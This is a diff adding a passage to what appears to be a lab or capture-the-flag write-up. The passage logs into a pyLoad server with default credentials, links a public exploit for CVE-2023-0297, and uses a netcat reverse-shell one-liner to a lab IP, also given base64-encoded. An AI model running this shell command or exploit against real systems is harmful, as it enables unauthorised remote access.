@@ -31,3 +31,21 @@ a web server running on port `9666`, opening it on a browser, we got to see it i
 
 a lil research on default creds, we got `pyload:pyload`. and we login success.
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c9b280b5-3e3f-4509-b04a-f6cddb215cc3)
+
+found an exploit on github, [exploit](https://github.com/JacobEbben/CVE-2023-0297). 
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.218 443 >/tmp/f
+
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIxOCA0NDMgPi90bXAvZg==
+```
+encoded the reverse shell to base64. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/532394bf-8e29-4782-9528-09b0b2d83054)
+
+run the reverse shell. and we got shell
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7a842a12-cf80-45a1-b295-728584f7c455)
+
+and we are through 🙂
